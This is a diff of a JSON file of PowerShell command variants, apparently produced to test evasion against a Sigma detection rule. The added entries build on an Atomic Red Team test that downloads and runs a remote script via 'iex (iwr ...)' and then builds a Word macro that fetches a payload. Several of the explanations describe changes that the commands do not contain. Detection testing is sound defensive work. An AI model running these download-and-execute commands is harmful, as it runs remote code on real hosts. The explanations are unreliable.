@@ -1,22 +1,13 @@
 [
   {
-    "output": "powershell.exe -c \"& {iex (gc payload.ps1 -raw)}\"",
-    "explanation": "This command uses reordering and substitution to maintain the same behavior as the original. Instead of directly using `iex (gc ...)`, it wraps it in a scriptblock (`& { ... }`) and uses `gc` as a shorthand for `Get-Content`. This is a safe mutation that still matches the Sigma rule."
+    "output": "powershell.exe -Command \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex (iwr 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1' -UseBasicParsing); $macroCode = Get-Content 'C:\\AtomicRedTeam\\atomics\\T1204.002\\src\\test9-GenericPayloadDownload.txt' -Raw; $URL = '' + ''; $macroCode = $macroCode -replace 'serverPath', $URL -replace 'fileName', 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/test9-example-payload.txt'; Invoke-MalDoc -macroCode $macroCode -officeProduct 'Word'\"",
+    "explanation": "This command uses the equivalent syntax for inline execution (iex) and file reading (Get-Content with -Raw), but rewrites the command line to avoid explicit use of quoted strings and uses the -Command parameter instead of ampersand invocation. This is a safe mutation for testing purposes."
   },
   {
-    "output": "powershell.exe -Command \"iex (Get-Content -Path 'payload.ps1' -Raw)\"",
-    "explanation": "This command uses substitution by replacing `gc` with `Get-Content` and `-ra` with `-Raw`. It also adds quotes around the path for clarity, which is a safe mutation that still matches the Sigma rule."
+    "output": "powershell.exe -c \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex (iwr 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1' -UseBasicParsing); $macroCode = gc 'C:\\AtomicRedTeam\\atomics\\T1204.002\\src\\test9-GenericPayloadDownload.txt' -Raw; $URL = '' + ''; $macroCode = $macroCode -replace 'serverPath', $URL -replace 'fileName', 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/test9-example-payload.txt'; Invoke-MalDoc -macroCode $macroCode -officeProduct 'Word'\"",
+    "explanation": "This command uses short-form syntax (-c for -Command) and substitutes 'Get-Content' with 'gc' to avoid explicit use of full command names. It also removes unnecessary quotes and uses a more compact form while maintaining the same behavior."
   },
   {
-    "output": "powershell.exe -c \"iex (type payload.ps1 -Raw)\"",
-    "explanation": "This command uses substitution by replacing `Get-Content` with `type`, which is an equivalent command in PowerShell. The `-Raw` flag is preserved, and the command remains functionally identical to the original."
-  },
-  {
-    "output": "powershell.exe -Command \"& {iex (gc 'payload.ps1' -Raw)}\"",
-    "explanation": "This command uses reordering and substitution by wrapping the inline execution in a scriptblock (`& { ... }`) and using `gc` as shorthand for `Get-Content`. It also adds quotes around the file path for clarity, which is a safe mutation that still matches the Sigma rule."
-  },
-  {
-    "output": "powershell.exe -c \"iex (gc payload.ps1 -ra)\"",
-    "explanation": "This command uses substitution by replacing `-Raw` with its shorthand `-ra`. It is a direct equivalent and still matches the Sigma rule."
+    "output": "powershell.exe -Command \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex (iwr 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1' -UseBasicParsing); $macroCode = Get-Content -Path 'C:\\AtomicRedTeam\\atomics\\T1204.002\\src\\test9-GenericPayloadDownload.txt' -Raw; $URL = '' + ''; $macroCode = $macroCode -replace 'serverPath', $URL -replace 'fileName', 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/test9-example-payload.txt'; Invoke-MalDoc -macroCode $macroCode -officeProduct 'Word'\"",
+    "explanation": "This command reorders the arguments for Get-Content and uses the -Path parameter explicitly to avoid ambiguity. It also removes unnecessary quotes and uses a more compact form while maintaining the same behavior."
   }
-]
